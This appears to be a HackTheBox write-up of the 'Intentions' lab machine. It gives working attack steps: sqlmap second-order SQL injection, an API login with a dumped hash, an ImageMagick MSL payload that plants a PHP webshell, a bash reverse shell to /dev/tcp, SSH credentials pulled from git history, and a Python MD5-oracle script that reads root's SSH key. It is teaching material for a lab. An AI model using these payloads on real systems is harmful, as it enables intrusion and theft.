---
title: "Intentions"
date: 2026-08-14 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, sql-injection, second-order-sqli, api-bypass, imagemagick, msl-injection, git-history, linux-capabilities, md5-oracle]
description: "A gallery app's genre preference field was vulnerable to second-order SQL injection that dumped admin bcrypt hashes; an undocumented v2 API accepted the raw hash in lieu of a password, granting admin access where a crafted ImageMagick MSL payload wrote a PHP webshell and landed a shell as www-data."
---
## Overview

Intentions is a hard Linux machine hosting a photo gallery web application. The path to foothold chains three techniques: a [second-order SQL injection](https://cwe.mitre.org/data/definitions/89.html) in the genre preference field dumps admin bcrypt hashes, an undocumented v2 API endpoint accepts those hashes directly as credentials (an [authentication bypass](https://cwe.mitre.org/data/definitions/288.html)), and the admin image editor processes a crafted ImageMagick MSL XML file via a PHP temp-file wildcard to achieve [code injection](https://cwe.mitre.org/data/definitions/94.html) and write a webshell as `www-data`. Lateral movement to `greg` comes from plaintext SSH credentials committed and later reverted in the app's git history, while root is reached by abusing a `cap_dac_read_search` capability on a scanner binary that acts as an MD5 oracle, recovering `/root/.ssh/id_rsa` byte by byte.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.6,122.8 150.0,150.0 98.4,221.2 87.3,129.6" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

High Enumeration and Real-Life scores reflect the multi-layer API discovery and the realistic attack techniques of second-order SQLi, credential exposure in git history, and capability abuse; the CVE axis is flat because no named public CVE drives the chain, while Custom Exploitation scores high for the bespoke MSL payload and Python MD5 oracle script.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | SSH access |
| 80/tcp | nginx | PHP gallery app — `intentions.htb` |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 -Pn 10.10.10.X | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV -Pn 10.10.10.X
```

Only two ports open — SSH on 22 and nginx on 80 serving a PHP-based photo gallery application at `intentions.htb` that requires registration to use.

## Enumeration

Add the vhost to `/etc/hosts`:

```bash
echo "10.10.10.X intentions.htb" | sudo tee -a /etc/hosts
```

Directory enumeration of the web root reveals `/admin`, `/gallery`, and `/storage`:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/ -b 403,404
```

Enumeration of the API path tree uncovers an undocumented v2 login endpoint that returns HTTP 405 (method not allowed on GET, expecting POST):

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404
```

Probing the v2 endpoint shows it expects `email` and `hash` fields — not `password`:

```bash
curl -X POST http://intentions.htb/api/v2/auth/login
```

After registering a normal user, the "Favorite Genres" preference field at `/api/v1/gallery/user/genres` stores input into the database. The `/api/v1/gallery/user/feed` endpoint later reads those values and builds a SQL query via string concatenation — a classic [second-order SQL injection](https://cwe.mitre.org/data/definitions/89.html) pattern. Capture the genres update request and the feed fetch request in Burp Suite, save them as `updateGenresRequest` and `fetchFeedRequest`, then confirm the injection:

```bash
sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment
```

The `space2comment` tamper replaces spaces with `/**/` to bypass the space-stripping filter. Enumerate tables:

```bash
sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment --tables
```

Dump the `users` table to retrieve bcrypt hashes for admin accounts `steve@intentions.htb` and `greg@intentions.htb`:

```bash
sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment -T users --dump
```

## Foothold

With the admin bcrypt hash for `steve`, authenticate directly against the v2 API — the endpoint accepts the hash as proof of identity, bypassing password verification entirely ([CWE-288](https://cwe.mitre.org/data/definitions/288.html)):

```bash
curl -s -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
```

This returns `{"status":"success","name":"steve"}` and sets a JWT cookie granting admin access to the image editor at `/api/v2/admin/image/modify`.

Create a malicious ImageMagick MSL XML payload. When ImageMagick processes this file, it writes a PHP webshell to the public storage path ([CWE-94](https://cwe.mitre.org/data/definitions/94.html)):

```bash
printf '<?xml version="1.0" encoding="UTF-8"?>\n<image>\n  <read filename="caption:<?php @passthru(@$_REQUEST['"'"'c'"'"']); ?>" />\n  <write filename="info:/var/www/html/intentions/storage/app/public/rce.php" />\n</image>\n' > payload.msl
```

Upload the MSL file via the image modify endpoint. PHP writes the uploaded file to a `/tmp/phpXXXXXX` temporary path; the `vid:msl:/tmp/php*` wildcard URI instructs ImageMagick to process any matching temp file as an MSL script:

```bash
curl 'http://intentions.htb/api/v2/admin/image/modify' \
  -X POST \
  -H 'X-XSRF-TOKEN: <token>' \
  -H 'Cookie: XSRF-TOKEN=<token>; token=<jwt>' \
  -F 'path=vid:msl:/tmp/php*' \
  -F 'effect=asd' \
  -F 'file=@payload.msl'
```

Verify the webshell was written and is executing:

```bash
curl 'http://intentions.htb/storage/rce.php?c=id'
```

This returns `uid=33(www-data)`. Trigger a reverse shell:

```bash
curl 'http://intentions.htb/storage/rce.php' --data 'c=bash+-c+"bash+-i+>%26+/dev/tcp/<lhost>/<lport>+0>%261"'
```

## Lateral Movement

As `www-data`, the application's `.git` directory is readable. Git added a `safe.directory` restriction in newer versions, but it can be bypassed by writing a gitconfig to a writable location:

```bash
HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
```

List all commits to identify interesting history:

```bash
HOME=/tmp git -C /var/www/html/intentions log --all --oneline
```

Grep the full patch diffs for credentials committed and later reverted ([CWE-540](https://cwe.mitre.org/data/definitions/540.html)):

```bash
HOME=/tmp git -C /var/www/html/intentions log -p --all | grep -iE '^\+.*(password|secret|key|token|DB_PASS)' | head -30
```

This reveals `greg:Gr3g1sTh3B3stDev3l0per!1998` on a `+` diff line — added in one commit, removed in the next, but permanently stored in the object store. SSH in as `greg`:

```bash
sshpass -p 'Gr3g1sTh3B3stDev3l0per!1998' ssh greg@10.10.10.X
```

## User flag

```bash
cat /home/greg/user.txt   # HTB{...}
```

Landed as `greg` via credentials recovered from git history; user flag is ours.

## Privilege Escalation

Audit Linux capabilities on the filesystem ([CWE-250](https://cwe.mitre.org/data/definitions/250.html)):

```bash
getcap -r / 2>/dev/null
```

This shows `/opt/scanner/scanner` has `cap_dac_read_search+eip` — the binary can open and read any file on the system regardless of ownership or permissions. Inspect its flags:

```bash
/opt/scanner/scanner --help
```

The `-l N` flag hashes only the first N bytes of the target file, and `-n` outputs the raw MD5 without the filename. This is an oracle: by calling the binary with `-l 1`, `-l 2`, etc., and comparing each output against the MD5 of every printable character appended to the already-known prefix, each byte of any file can be recovered one at a time.

Test the oracle against a root-owned file:

```bash
/opt/scanner/scanner -c 7Bear4C5Bu11LongL3g -f /root/root.txt -l 1 -n -i
```

Save the extraction script:

```bash
cat > /tmp/extract.py << 'PYEOF'
import subprocess, hashlib, string, sys

BINARY = "/opt/scanner/scanner"
KEY = "7Bear4C5Bu11LongL3g"
TARGET = sys.argv[1] if len(sys.argv) > 1 else "/root/.ssh/id_rsa"
CHARS = string.printable

known = ""
while True:
    matched = False
    for c in CHARS:
        candidate = known + c
        l = len(candidate)
        result = subprocess.run(
            [BINARY, "-c", KEY, "-f", TARGET, "-l", str(l), "-n", "-i"],
            capture_output=True, text=True
        )
        expected = hashlib.md5(candidate.encode()).hexdigest()
        if result.stdout.strip() == expected:
            known = candidate
            sys.stdout.write(c); sys.stdout.flush()
            matched = True
            break
    if not matched:
        break
print()
PYEOF
```

Run the extractor against root's SSH private key (takes roughly 2-3 minutes):

```bash
python3 /tmp/extract.py /root/.ssh/id_rsa > /tmp/root_key && chmod 600 /tmp/root_key
```

SSH as root using the recovered private key:

```bash
ssh -i /tmp/root_key root@10.10.10.X
```

## Root flag

```bash
cat /root/root.txt   # HTB{...}
```

Full compromise achieved — root access obtained by recovering the private key byte-by-byte through the `cap_dac_read_search` MD5 oracle.
